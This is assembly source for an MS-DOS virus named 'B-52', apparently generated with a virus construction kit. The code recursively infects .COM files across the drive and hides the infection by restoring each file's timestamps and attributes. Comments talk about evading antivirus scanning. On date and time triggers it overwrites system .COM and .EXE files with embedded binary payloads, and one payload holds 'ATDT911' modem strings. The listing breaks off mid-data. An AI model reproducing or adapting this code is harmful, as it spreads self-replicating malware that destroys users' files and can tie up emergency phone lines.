; B-52.ASM -- B-52
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by FrankenChrist

virus_type      equ     0                       ; Appending Virus

is_encrypted    equ     0                       ; We're not encrypted
						; Yeah, it oughtta be
						; considering all the 
						; ascii you can see in
						; the final product, 
						; but SCAN 97 can detect
						; it if you use encyption
						; so if you know how to 
						; modify the encryption
						; so it doesn't scan I'd 
						; love to know.

tsr_virus       equ     0                       ; We're not TSR

code            segment byte public
		assume  cs:code,ds:code,es:code,ss:code
		org     0100h

main            proc    near
		db      0E9h,00h,00h            ; Near jump (for compatibility)
start:          call    find_offset             ; Like a PUSH IP
find_offset:    pop     bp                      ; BP holds old IP
		sub     bp,offset find_offset   ; Adjust for length of host

		lea     si,[bp + buffer]        ; SI points to original start
		mov     di,0100h                ; Push 0100h on to stack for
		push    di                      ; return to main program
		movsw                           ; Copy the first two bytes
		movsb                           ; Copy the third byte

		mov     di,bp                   ; DI points to start of virus

		mov     bp,sp                   ; BP points to stack
		sub     sp,128                  ; Allocate 128 bytes on stack

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address on stack

		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer on stack
		int     021h

		call    search_files            ; Find and infect a file
		call    search_files            ; Find and infect another file
		call    get_month
		cmp     ax,0004h                ; Did the function return 4?
		jg      skip00                  ; If greater, skip effect
		call    get_hour
		cmp     ax,0017h                ; Did the function return 23?
		jne     skip00                  ; If not equal, skip effect
		jmp     short strt00            ; Success -- skip jump
skip00:         jmp     end00                   ; Skip the routine
strt00:         lea     dx,[di + data00]        ; DX points to data
		lea     si,[di + data01]        ; SI points to data
		call    drop_program
end00:          call    get_hour
		cmp     ax,000Eh                ; Did the function return 14?
		jg      skip01                  ; If greater, skip effect
		call    get_minute
		cmp     ax,0028h                ; Did the function return 40?
		jl      skip01                  ; If less, skip effect
		jmp     short strt01            ; Success -- skip jump
skip01:         jmp     end01                   ; Skip the routine
strt01:         lea     dx,[di + data02]        ; DX points to data
		lea     si,[di + data03]        ; SI points to data
		call    drop_program
end01:          call    get_second
		cmp     ax,001Eh                ; Did the function return 30?
		jl      skip02                  ; If less, skip effect
		call    get_weekday
		cmp     ax,0003h                ; Did the function return 3?
		jne     skip02                  ; If not equal, skip effect
		jmp     short strt02            ; Success -- skip jump
skip02:         jmp     end02                   ; Skip the routine
strt02:         lea     dx,[di + data04]        ; DX points to data
		lea     si,[di + data05]        ; SI points to data
		call    drop_program
end02:
com_end:        pop     dx                      ; DX holds original DTA address
		mov     ah,01Ah                 ; DOS set DTA function
		int     021h

		mov     sp,bp                   ; Deallocate local buffer

		xor     ax,ax                   ;
		mov     bx,ax                   ;
		mov     cx,ax                   ;
		mov     dx,ax                   ; Empty out the registers
		mov     si,ax                   ;
		mov     di,ax                   ;
		mov     bp,ax                   ;

		ret                             ; Return to original program
main            endp

search_files    proc    near
		push    bp                      ; Save BP
		mov     bp,sp                   ; BP points to local buffer
		sub     sp,64                   ; Allocate 64 bytes on stack

		mov     ah,047h                 ; DOS get current dir function
		xor     dl,dl                   ; DL holds drive # (current)
		lea     si,[bp - 64]            ; SI points to 64-byte buffer
		int     021h

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[di + root]          ; DX points to root directory
		int     021h

		call    traverse                ; Start the traversal

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 64]            ; DX points to old directory
		int     021h

		mov     sp,bp                   ; Restore old stack pointer
		pop     bp                      ; Restore BP
		ret                             ; Return to caller

root            db      "\",0                   ; Root directory
search_files    endp

traverse        proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first function
		mov     cx,00010000b            ; CX holds search attributes
		lea     dx,[di + all_files]     ; DX points to "*.*"
		int     021h
		jc      leave_traverse          ; Leave if no files present

check_dir:      cmp     byte ptr [bp - 107],16  ; Is the file a directory?
		jne     another_dir             ; If not, try again
		cmp     byte ptr [bp - 98],'.'  ; Did we get a "." or ".."?
		je      another_dir             ;If so, keep going

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 98]            ; DX points to new directory
		int     021h

		call    traverse                ; Recursively call ourself

		pushf                           ; Save the flags
		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[di + up_dir]        ; DX points to parent directory
		int     021h
		popf                            ; Restore the flags

		jnc     done_searching          ; If we infected then exit

another_dir:    mov     ah,04Fh                 ; DOS find next function
		int     021h
		jnc     check_dir               ; If found check the file

leave_traverse:
		lea     dx,[di + com_mask]      ; DX points to "*.COM"
		call    find_files              ; Try to infect a file
done_searching: mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller

up_dir          db      "..",0                  ; Parent directory name
all_files       db      "*.*",0                 ; Directories to search for
com_mask        db      "*.COM",0               ; Mask for all .COM files
traverse        endp

find_files      proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		push    dx                      ; Save file mask
		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first file function
		mov     cx,00100111b            ; CX holds all file attributes
		pop     dx                      ; Restore file mask
find_a_file:    int     021h
		jc      done_finding            ; Exit if no files found
		call    infect_file             ; Infect the file!
		jnc     done_finding            ; Exit if no error
		mov     ah,04Fh                 ; DOS find next file function
		jmp     short find_a_file       ; Try finding another file

done_finding:   mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller
find_files      endp

infect_file     proc    near
		mov     ah,02Fh                 ; DOS get DTA address function
		int     021h
		mov     si,bx                   ; SI points to the DTA

		mov     byte ptr [di + set_carry],0  ; Assume we'll fail

		cmp     word ptr [si + 01Ah],(65279 - (finish - start))
		jbe     size_ok                 ; If it's small enough continue
		jmp     infection_done          ; Otherwise exit

size_ok:        mov     ax,03D00h               ; DOS open file function, r/o
		lea     dx,[si + 01Eh]          ; DX points to file name
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,03Fh                 ; DOS read from file function
		mov     cx,3                    ; CX holds bytes to read (3)
		lea     dx,[di + buffer]        ; DX points to buffer
		int     021h

		mov     ax,04202h               ; DOS file seek function, EOF
		cwd                             ; Zero DX _ Zero bytes from end
		mov     cx,dx                   ; Zero CX /
		int     021h

		xchg    dx,ax                   ; Faster than a PUSH AX
		mov     ah,03Eh                 ; DOS close file function
		int     021h
		xchg    dx,ax                   ; Faster than a POP AX

		sub     ax,finish - start + 3   ; Adjust AX for a valid jump
		cmp     word ptr [di + buffer + 1],ax  ; Is there a JMP yet?
		je      infection_done          ; If equal then exit
		mov     byte ptr [di + set_carry],1  ; Success -- the file is OK
		add     ax,finish - start       ; Re-adjust to make the jump
		mov     word ptr [di + new_jump + 1],ax  ; Construct jump

		mov     ax,04301h               ; DOS set file attrib. function
		xor     cx,cx                   ; Clear all attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

		mov     ax,03D02h               ; DOS open file function, r/w
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,040h                 ; DOS write to file function
		mov     cx,3                    ; CX holds bytes to write (3)
		lea     dx,[di + new_jump]      ; DX points to the jump we made
		int     021h

		mov     ax,04202h               ; DOS file seek function, EOF
		cwd                             ; Zero DX _ Zero bytes from end
		mov     cx,dx                   ; Zero CX /
		int     021h

		mov     ah,040h                 ; DOS write to file function
		mov     cx,finish - start       ; CX holds virus length
		lea     dx,[di + start]         ; DX points to start of virus
		int     021h

		mov     ax,05701h               ; DOS set file time function
		mov     cx,[si + 016h]          ; CX holds old file time
		mov     dx,[si + 018h]          ; DX holds old file date
		int     021h

		mov     ah,03Eh                 ; DOS close file function
		int     021h

		mov     ax,04301h               ; DOS set file attrib. function
		xor     ch,ch                   ; Clear CH for file attribute
		mov     cl,[si + 015h]          ; CX holds file's old attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

infection_done: cmp     byte ptr [di + set_carry],1  ; Set carry flag if failed
		ret                             ; Return to caller

set_carry       db      ?                       ; Set-carry-on-exit flag
buffer          db      090h,0CDh,020h          ; Buffer to hold old three bytes
new_jump        db      0E9h,?,?                ; New jump to virus
infect_file     endp


drop_program    proc    near
		push    di                      ; Save DI
		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		mov     di,bx                   ; DI points to DTA
		mov     ah,04Eh                 ; DOS find first file function
		mov     cx,00100111b            ; CX holds all file attributes
		int     021h
		jc      create_file             ; If not found then create it
write_in_file:  mov     ax,04301h               ; DOS set file attributes function
		xor     cx,cx                   ; File will have no attributes
		lea     dx,[di + 01Eh]          ; DX points to file name
		int     021h
		mov     ax,03D01h               ; DOS open file function, write
		lea     dx,[di + 01Eh]          ; DX points to file name
		int     021h
		xchg    bx,ax                   ; Transfer file handle to AX
		mov     ah,040h                 ; DOS write to file function
		mov     cx,[si]                 ; CX holds number of byte to write
		lea     dx,[si + 2]             ; DX points to the data
		int     021h
		mov     ax,05701h               ; DOS set file date/time function
		mov     cx,[di + 016h]          ; CX holds old file time
		mov     dx,[di + 018h]          ; DX holds old file data
		int     021h
		mov     ah,03Eh                 ; DOS close file function
		int     021h
		mov     ax,04301h               ; DOS set file attributes function
		xor     ch,ch                   ; Clear CH for attributes
		mov     cl,[di + 015h]          ; CL holds old attributes
		lea     dx,[di + 01Eh]          ; DX points to file name
		int     021h
		mov     ah,04Fh                 ; DOS find next file function
		int     021h
		jnc     write_in_file           ; If successful do next file
		jmp     short dropper_end       ; Otherwise exit
create_file:    mov     ah,03Ch                 ; DOS create file function
		xor     cx,cx                   ; File has no attributes
		int     021h
		xchg    bx,ax                   ; Transfer file handle to AX
		mov     ah,040h                 ; DOS write to file function
		mov     cx,[si]                 ; CX holds number of byte to write
		lea     dx,[si + 2]             ; DX points to the data
		int     021h
		mov     ah,03Eh                 ; DOS close file function
		int     021h
dropper_end:    pop     di                      ; Restore DI
		ret                             ; Return to caller
drop_program    endp


data00          db      "c:\dos\*.com",0

get_hour        proc    near
		mov     ah,02Ch                 ; DOS get time function
		int     021h
		mov     al,ch                   ; Copy hour into AL
		cbw                             ; Sign-extend AL into AX
		ret                             ; Return to caller
get_hour        endp

get_minute      proc    near
		mov     ah,02Ch                 ; DOS get time function
		int     021h
		mov     al,cl                   ; Copy minute into AL
		cbw                             ; Sign-extend AL into AX
		ret                             ; Return to caller
get_minute      endp

get_month       proc    near
		mov     ah,02Ah                 ; DOS get date function
		int     021h
		mov     al,dh                   ; Copy month into AL
		cbw                             ; Sign-extend AL into AX
		ret                             ; Return to caller
get_month       endp

get_second      proc    near
		mov     ah,02Ch                 ; DOS get time function
		int     021h
		mov     al,dh                   ; Copy second into AL
		cbw                             ; Sign-extend AL into AX
		ret                             ; Return to caller
get_second      endp

get_weekday     proc    near
		mov     ah,02Ah                 ; DOS get date function
		int     021h
		cbw                             ; Sign-extend AL into AX
		ret                             ; Return to caller
get_weekday     endp

data01          dw      269h
		db      0E9h, 000h, 000h, 0BFh, 012h, 001h, 0B9h, 073h
		db      001h, 02Eh, 081h, 005h, 000h, 000h, 047h, 047h
		db      0E2h, 0F7h, 0E8h, 000h, 000h, 05Dh, 081h, 0EDh
		db      015h, 001h, 081h, 0FCh, 04Ah, 054h, 074h, 00Bh
		db      08Dh, 0B6h, 0F8h, 001h, 0BFh, 000h, 001h, 057h
		db      0A4h, 0EBh, 011h, 01Eh, 006h, 00Eh, 01Fh, 00Eh
		db      007h, 08Dh, 0B6h, 0F7h, 001h, 08Dh, 0BEh, 0EFh
		db      001h, 0A5h, 0A5h, 0A5h, 0A5h, 0C6h, 086h, 097h
		db      004h, 003h, 0B4h, 01Ah, 08Dh, 096h, 06Ch, 004h
		db      0CDh, 021h, 0B4h, 047h, 0B2h, 000h, 08Dh, 0B6h
		db      02Ch, 004h, 0CDh, 021h, 0C6h, 086h, 02Bh, 004h
		db      05Ch, 0B8h, 024h, 035h, 0CDh, 021h, 089h, 09Eh
		db      027h, 004h, 08Ch, 086h, 029h, 004h, 0B4h, 025h
		db      08Dh, 096h, 0E7h, 003h, 0CDh, 021h, 00Eh, 007h
		db      08Dh, 096h, 0EAh, 003h, 0E8h, 0E3h, 000h, 08Dh
		db      096h, 0F0h, 003h, 0E8h, 0DCh, 000h, 0B4h, 03Bh
		db      08Dh, 096h, 0F6h, 003h, 0CDh, 021h, 073h, 0E8h
		db      0B4h, 02Ah, 0CDh, 021h, 080h, 0FAh, 00Fh, 072h
		db      020h, 081h, 0F9h, 0C8h, 007h, 072h, 01Ah, 03Ch
		db      000h, 075h, 016h, 0B4h, 02Ch, 0CDh, 021h, 080h
		db      0FDh, 013h, 075h, 00Dh, 080h, 0F9h, 0FFh, 074h
		db      056h, 080h, 0FEh, 0FFh, 075h, 003h, 080h, 0FAh
		db      03Ch, 0B8h, 024h, 025h, 0C5h, 096h, 027h, 004h
		db      0CDh, 021h, 00Eh, 01Fh, 0B4h, 03Bh, 08Dh, 096h
		db      02Bh, 004h, 0CDh, 021h, 0B4h, 01Ah, 0BAh, 080h
		db      000h, 081h, 0FCh, 046h, 054h, 074h, 003h, 0CDh
		db      021h, 0C3h, 007h, 01Fh, 0CDh, 021h, 08Ch, 0C0h
		db      005h, 010h, 000h, 02Eh, 001h, 086h, 0F1h, 001h
		db      02Eh, 003h, 086h, 0F5h, 001h, 0FAh, 02Eh, 08Bh
		db      0A6h, 0F3h, 001h, 08Eh, 0D0h, 0FBh, 0EAh, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      0CDh, 020h, 000h, 000h, 000h, 000h, 000h, 0BEh
		db      03Ah, 002h, 033h, 0D2h, 0E8h, 022h, 000h, 0BEh
		db      03Ah, 002h, 0BAh, 001h, 000h, 0E8h, 019h, 000h
		db      0BEh, 03Ah, 002h, 0BAh, 002h, 000h, 0E8h, 010h
		db      000h, 0BEh, 03Ah, 002h, 0BAh, 003h, 000h, 0E8h
		db      007h, 000h, 0B8h, 000h, 04Ch, 0CDh, 021h, 0EBh
		db      088h, 0B8h, 043h, 000h, 0CDh, 014h, 0B4h, 001h
		db      0ACh, 00Ah, 0C0h, 074h, 004h, 0CDh, 014h, 0EBh
		db      0F5h, 0C3h, 041h, 054h, 026h, 046h, 04Ch, 030h
		db      04Dh, 030h, 044h, 054h, 039h, 031h, 031h, 00Dh
		db      00Ah, 000h, 05Bh, 04Dh, 050h, 043h, 05Dh, 000h
		db      043h, 061h, 06Ch, 06Ch, 020h, 039h, 031h, 031h
		db      020h, 000h, 0B4h, 04Eh, 0B9h, 007h, 000h, 0CDh
		db      021h, 072h, 04Eh, 0B0h, 000h, 0E8h, 05Ch, 001h
		db      0B4h, 03Fh, 08Dh, 096h, 098h, 004h, 0B9h, 01Ah
		db      000h, 0CDh, 021h, 0B4h, 03Eh, 0CDh, 021h, 081h
		db      0BEh, 098h, 004h, 04Dh, 05Ah, 074h, 026h, 08Bh
		db      086h, 08Fh, 004h, 03Dh, 04Eh, 044h, 074h, 025h
		db      08Bh, 086h, 086h, 004h, 03Dh, 0F4h, 001h, 072h
		db      01Ch, 03Dh, 050h, 0FCh, 077h, 017h, 08Bh, 09Eh
		db      099h, 004h, 081h, 0C3h, 0F9h, 002h, 03Bh, 0C3h
		db      074h, 00Bh, 0EBh, 07Ch, 090h, 081h, 0BEh, 0A8h
		db      004h, 04Ah, 054h, 075h, 005h, 0B4h, 04Fh, 0EBh
		db      0AEh, 0C3h, 0C4h, 086h, 0ACh, 004h, 089h, 086h
		db      0F7h, 001h, 08Ch, 086h, 0F9h, 001h, 0C4h, 086h
		db      0A6h, 004h, 08Ch, 086h, 0FBh, 001h, 089h, 086h
		db      0FDh, 001h, 08Bh, 086h, 0A0h, 004h, 0B1h, 004h
		db      0D3h, 0E0h, 093h, 0C4h, 086h, 086h, 004h, 08Ch
		db      0C2h, 050h, 052h, 02Bh, 0C3h, 083h, 0DAh, 000h
		db      0B9h, 010h, 000h, 0F7h, 0F1h, 089h, 096h, 0ACh
		db      004h, 089h, 086h, 0AEh, 004h, 089h, 086h, 0A6h
		db      004h, 0C7h, 086h, 0A8h, 004h, 04Ah, 054h, 05Ah
		db      058h, 005h, 0F6h, 002h, 083h, 0D2h, 000h, 0B1h
		db      009h, 050h, 0D3h, 0E8h, 0D3h, 0CAh, 0F9h, 013h
		db      0D0h, 058h, 080h, 0E4h, 001h, 089h, 096h, 09Ch
		db      004h, 089h, 086h, 09Ah, 004h, 00Eh, 007h, 0FFh
		db      0B6h, 0ACh, 004h, 0B9h, 01Ah, 000h, 0EBh, 01Ah
		db      0B9h, 003h, 000h, 02Bh, 0C1h, 08Dh, 0B6h, 098h
		db      004h, 08Dh, 0BEh, 0F8h, 001h, 0A5h, 0A4h, 0C6h
		db      044h, 0FDh, 0E9h, 089h, 044h, 0FEh, 005h, 003h
		db      001h, 050h, 051h, 033h, 0C9h, 0E8h, 08Eh, 000h
		db      0B0h, 002h, 0E8h, 07Fh, 000h, 0B4h, 040h, 08Dh
		db      096h, 098h, 004h, 059h, 0CDh, 021h, 0B8h, 002h
		db      042h, 033h, 0C9h, 099h, 0CDh, 021h, 0B4h, 02Ch
		db      0CDh, 021h, 089h, 096h, 00Ch, 001h, 08Dh, 0BEh
		db      0F9h, 003h, 0B8h, 055h, 053h, 0ABh, 08Dh, 0B6h
		db      003h, 001h, 0B9h, 00Fh, 000h, 056h, 051h, 0F3h
		db      0A4h, 080h, 0B6h, 00Bh, 001h, 028h, 08Dh, 0B6h
		db      0D8h, 003h, 0B9h, 00Fh, 000h, 0F3h, 0A4h, 059h
		db      05Eh, 05Ah, 057h, 056h, 051h, 0F3h, 0A4h, 0B8h
		db      05Dh, 05Bh, 0ABh, 0B0h, 0C3h, 0AAh, 083h, 0C2h
		db      00Fh, 089h, 096h, 004h, 001h, 0E8h, 061h, 000h
		db      059h, 05Fh, 05Eh, 0F3h, 0A4h, 0B8h, 001h, 057h
		db      08Bh, 08Eh, 082h, 004h, 08Bh, 096h, 084h, 004h
		db      0CDh, 021h, 0B4h, 03Eh, 0CDh, 021h, 0B5h, 000h
		db      08Ah, 08Eh, 081h, 004h, 0E8h, 017h, 000h, 0FEh
		db      08Eh, 097h, 004h, 075h, 004h, 058h, 0E9h, 0C7h
		db      0FDh, 0E9h, 0E9h, 0FEh, 0B4h, 03Dh, 08Dh, 096h
		db      08Ah, 004h, 0CDh, 021h, 093h, 0C3h, 0B8h, 001h
		db      043h, 08Dh, 096h, 08Ah, 004h, 0CDh, 021h, 0C3h
		db      05Bh, 05Dh, 0B4h, 040h, 08Dh, 096h, 003h, 001h
		db      0B9h, 0F6h, 002h, 0CDh, 021h, 053h, 055h, 0B0h
		db      003h, 0CFh, 02Ah, 02Eh, 065h, 078h, 065h, 000h
		db      02Ah, 02Eh, 063h, 06Fh, 06Dh, 000h, 02Eh, 02Eh
		db      000h 

data02          db      "*.exe",0
		

data03          dw      64Ah
		db      0EBh, 007h, 069h, 090h, 090h, 090h, 0CDh, 020h
		db      090h, 0E8h, 000h, 000h, 05Dh, 081h, 0EDh, 00Ch
		db      001h, 050h, 0E8h, 002h, 000h, 0EBh, 021h, 03Eh
		db      08Ah, 086h, 046h, 007h, 08Dh, 0B6h, 035h, 001h
		db      0B9h, 00Fh, 006h, 030h, 004h, 0D2h, 0C0h, 046h
		db      0E2h, 0F9h, 0C3h, 0E8h, 0E9h, 0FFh, 059h, 0CDh
		db      021h, 0E8h, 0E3h, 0FFh, 0C3h, 051h, 0EBh, 0F3h
		db      058h, 033h, 0FFh, 0FAh, 08Eh, 0D7h, 0BCh, 0F0h
		db      002h, 0FBh, 0BEh, 096h, 000h, 036h, 08Bh, 01Ch
		db      036h, 08Bh, 04Ch, 002h, 08Dh, 096h, 037h, 007h
		db      036h, 089h, 014h, 036h, 08Ch, 04Ch, 002h, 026h
		db      08Bh, 0B5h, 0F8h, 002h, 081h, 0FEh, 043h, 046h
		db      075h, 002h, 0EBh, 035h, 02Eh, 089h, 05Dh, 04Ch
		db      02Eh, 089h, 04Dh, 04Eh, 00Eh, 007h, 03Eh, 0C6h
		db      086h, 074h, 007h, 000h, 03Eh, 0C6h, 086h, 043h
		db      007h, 003h, 08Dh, 0B6h, 005h, 001h, 0BFh, 000h
		db      001h, 0FCh, 0A5h, 0A5h, 0B4h, 01Ah, 08Dh, 096h
		db      047h, 007h, 0CDh, 021h, 0B4h, 04Eh, 08Dh, 096h
		db      03Ah, 007h, 08Dh, 0B6h, 065h, 007h, 052h, 0EBh
		db      044h, 0B4h, 01Ah, 0BAh, 080h, 000h, 0CDh, 021h
		db      033h, 0FFh, 08Eh, 0C7h, 0BEh, 096h, 000h, 02Eh
		db      08Bh, 05Dh, 04Ch, 026h, 089h, 01Ch, 02Eh, 08Bh
		db      04Dh, 04Eh, 026h, 089h, 04Ch, 002h, 00Eh, 007h
		db      03Eh, 08Bh, 086h, 072h, 007h, 033h, 0DBh, 08Bh
		db      0CBh, 08Bh, 0D1h, 08Bh, 0F2h, 08Bh, 0FEh, 0BCh
		db      0FEh, 0FFh, 0BDh, 000h, 001h, 055h, 08Bh, 0E8h
		db      0C3h, 00Bh, 0DBh, 074h, 006h, 0B4h, 03Eh, 0CDh
		db      021h, 033h, 0DBh, 0B4h, 04Fh, 05Ah, 052h, 033h
		db      0C9h, 033h, 0DBh, 0CDh, 021h, 073h, 003h, 0E9h
		db      0A4h, 000h, 0B8h, 002h, 03Dh, 08Bh, 0D6h, 0CDh
		db      021h, 072h, 0DEh, 08Bh, 0D8h, 0B4h, 03Fh, 0B9h
		db      004h, 000h, 08Dh, 096h, 005h, 001h, 0CDh, 021h
		db      03Eh, 080h, 0BEh, 008h, 001h, 069h, 074h, 0C9h
		db      03Eh, 080h, 0BEh, 005h, 001h, 04Dh, 074h, 0C1h
		db      0B8h, 002h, 042h, 033h, 0C9h, 033h, 0D2h, 0CDh
		db      021h, 080h, 0FCh, 0F8h, 077h, 0B3h, 03Eh, 089h
		db      086h, 075h, 007h, 0B4h, 040h, 0B9h, 004h, 000h
		db      08Dh, 096h, 005h, 001h, 0CDh, 021h, 03Eh, 08Ah
		db      0A6h, 046h, 007h, 0FEh, 0C4h, 080h, 0D4h, 000h
		db      03Eh, 088h, 0A6h, 046h, 007h, 0B4h, 040h, 0B9h
		db      03Eh, 006h, 08Dh, 096h, 009h, 001h, 0E8h, 0ECh
		db      0FEh, 0B8h, 000h, 042h, 033h, 0C9h, 033h, 0D2h
		db      0CDh, 021h, 03Eh, 08Bh, 086h, 075h, 007h, 040h
		db      03Eh, 089h, 086h, 006h, 001h, 03Eh, 0C6h, 086h
		db      005h, 001h, 0E9h, 03Eh, 0C6h, 086h, 008h, 001h
		db      069h, 0B4h, 040h, 0B9h, 004h, 000h, 08Dh, 096h
		db      005h, 001h, 0CDh, 021h, 03Eh, 0FEh, 086h, 074h
		db      007h, 03Eh, 0FEh, 08Eh, 043h, 007h, 074h, 02Eh
		db      03Eh, 0FEh, 086h, 046h, 007h, 03Eh, 080h, 096h
		db      046h, 007h, 000h, 0E9h, 043h, 0FFh, 03Eh, 080h
		db      0BEh, 074h, 007h, 003h, 073h, 018h, 0BFh, 000h
		db      001h, 081h, 03Dh, 0CDh, 020h, 074h, 00Fh, 08Dh
		db      096h, 040h, 007h, 0B4h, 03Bh, 0CDh, 021h, 072h
		db      005h, 0B4h, 04Eh, 0E9h, 02Fh, 0FFh, 033h, 0FFh
		db      08Eh, 0C7h, 0B4h, 02Ah, 0CDh, 021h, 080h, 0FAh
		db      004h, 075h, 009h, 080h, 0FEh, 007h, 075h, 004h
		db      033h, 0C0h, 0EBh, 01Eh, 0B4h, 02Ch, 0CDh, 021h
		db      00Ah, 0C9h, 075h, 023h, 080h, 0FDh, 006h, 07Dh
		db      01Eh, 002h, 0CDh, 08Bh, 0C1h, 098h, 002h, 0C6h
		db      012h, 0C2h, 080h, 0D4h, 000h, 00Bh, 0C0h, 075h
		db      001h, 040h, 08Bh, 0D0h, 0B9h, 001h, 000h, 033h
		db      0DBh, 0B4h, 019h, 0CDh, 021h, 0CDh, 026h, 0BBh
		db      0DCh, 003h, 0B4h, 02Ch, 0CDh, 021h, 0FEh, 0C6h
		db      03Ah, 036h, 004h, 004h, 07Ch, 006h, 02Ah, 036h
		db      004h, 004h, 0EBh, 0F4h, 08Ah, 0C6h, 08Ah, 0C8h
		db      098h, 0D1h, 0E0h, 003h, 0D8h, 08Bh, 037h, 08Ah
		db      06Ch, 0FFh, 08Bh, 0D6h, 0B4h, 009h, 0CDh, 021h
		db      080h, 0FDh, 000h, 074h, 029h, 080h, 0FDh, 001h
		db      074h, 0FEh, 080h, 0FDh, 002h, 074h, 021h, 080h
		db      0FDh, 003h, 074h, 014h, 080h, 0FDh, 004h, 074h
		db      057h, 080h, 0FDh, 005h, 074h, 06Dh, 080h, 0FDh
		db      006h, 074h, 060h, 080h, 0FDh, 007h, 074h, 003h
		db      0E9h, 056h, 0FEh, 0E8h, 0FDh, 0FFh, 0CDh, 020h
		db      08Dh, 096h, 0A9h, 003h, 0B4h, 009h, 0CDh, 021h
		db      0B4h, 001h, 0CDh, 021h, 08Dh, 096h, 0D9h, 003h
		db      0B4h, 009h, 0CDh, 021h, 03Ch, 061h, 072h, 002h
		db      02Ch, 020h, 03Ch, 041h, 074h, 0E0h, 03Ch, 052h
		db      075h, 00Ch, 08Dh, 096h, 0D9h, 003h, 0B4h, 009h
		db      0CDh, 021h, 08Ah, 0F1h, 0EBh, 08Eh, 03Ch, 049h
		db      074h, 0C6h, 03Ch, 046h, 075h, 0CAh, 08Dh, 096h
		db      0C7h, 003h, 0B4h, 009h, 0CDh, 021h, 0CDh, 020h
		db      0B4h, 001h, 0CDh, 021h, 033h, 0C0h, 0B9h, 001h
		db      000h, 08Bh, 0D0h, 08Dh, 09Eh, 077h, 007h, 0CDh
		db      025h, 0EBh, 0A5h, 08Dh, 096h, 03Ah, 004h, 0B4h
		db      009h, 0CDh, 021h, 0B4h, 001h, 0CDh, 021h, 0EBh
		db      097h, 00Dh, 00Ah, 041h, 062h, 06Fh, 072h, 074h
		db      02Ch, 020h, 052h, 065h, 074h, 072h, 079h, 02Ch
		db      020h, 049h, 067h, 06Eh, 06Fh, 072h, 065h, 02Ch
		db      020h, 046h, 061h, 069h, 06Ch, 03Fh, 024h, 00Dh
		db      00Ah, 00Dh, 00Ah, 046h, 061h, 069h, 06Ch, 020h
		db      06Fh, 06Eh, 020h, 049h, 04Eh, 054h, 020h, 032h
		db      034h, 00Dh, 00Ah, 024h, 059h, 004h, 07Eh, 004h
		db      0A2h, 004h, 0C8h, 004h, 006h, 004h, 0FFh, 004h
		db      018h, 005h, 041h, 005h, 04Dh, 005h, 07Fh, 005h
		db      0EEh, 005h, 0F7h, 005h, 014h, 006h, 027h, 006h
		db      047h, 006h, 05Bh, 006h, 080h, 006h, 0ABh, 006h
		db      0CCh, 006h, 0F4h, 006h, 014h, 004h, 049h, 027h
		db      06Dh, 020h, 068h, 075h, 06Eh, 067h, 072h, 079h
		db      021h, 020h, 020h, 049h, 06Eh, 073h, 065h, 072h
		db      074h, 020h, 050h, 049h, 05Ah, 05Ah, 041h, 020h
		db      026h, 020h, 042h, 045h, 045h, 052h, 020h, 069h
		db      06Eh, 074h, 06Fh, 020h, 064h, 072h, 069h, 076h
		db      065h, 020h, 041h, 03Ah, 020h, 061h, 06Eh, 064h
		db      00Dh, 00Ah, 053h, 074h, 072h, 069h, 06Bh, 065h
		db      020h, 061h, 06Eh, 079h, 020h, 06Bh, 065h, 079h
		db      020h, 077h, 068h, 065h, 06Eh, 020h, 072h, 065h
		db      061h, 064h, 079h, 02Eh, 02Eh, 02Eh, 020h, 024h
		db      002h, 049h, 06Dh, 070h, 06Fh, 074h, 065h, 06Eh
		db      063h, 065h, 020h, 065h, 072h, 072h, 06Fh, 072h
		db      020h, 072h, 065h, 061h, 064h, 069h, 06Eh, 067h
		db      020h, 075h, 073h, 065h, 072h, 027h, 073h, 020h
		db      064h, 069h, 063h, 06Bh, 024h, 000h, 050h, 072h
		db      06Fh, 067h, 072h, 061h, 06Dh, 020h, 074h, 06Fh
		db      06Fh, 020h, 062h, 069h, 067h, 020h, 074h, 06Fh
		db      020h, 066h, 069h, 074h, 020h, 069h, 06Eh, 020h
		db      06Dh, 065h, 06Dh, 06Fh, 072h, 079h, 00Dh, 00Ah
		db      024h, 001h, 043h, 061h, 06Eh, 06Eh, 06Fh, 074h
		db      020h, 06Ch, 06Fh, 061h, 064h, 020h, 043h, 04Fh
		db      04Dh, 04Dh, 041h, 04Eh, 044h, 02Ch, 020h, 073h
		db      079h, 073h, 074h, 065h, 06Dh, 020h, 068h, 061h
		db      06Ch, 074h, 065h, 064h, 00Dh, 00Ah, 024h, 000h
		db      049h, 027h, 06Dh, 020h, 073h, 06Fh, 072h, 072h
		db      079h, 02Ch, 020h, 044h, 061h, 076h, 065h, 02Eh
		db      02Eh, 02Eh, 02Eh, 020h, 062h, 075h, 074h, 020h
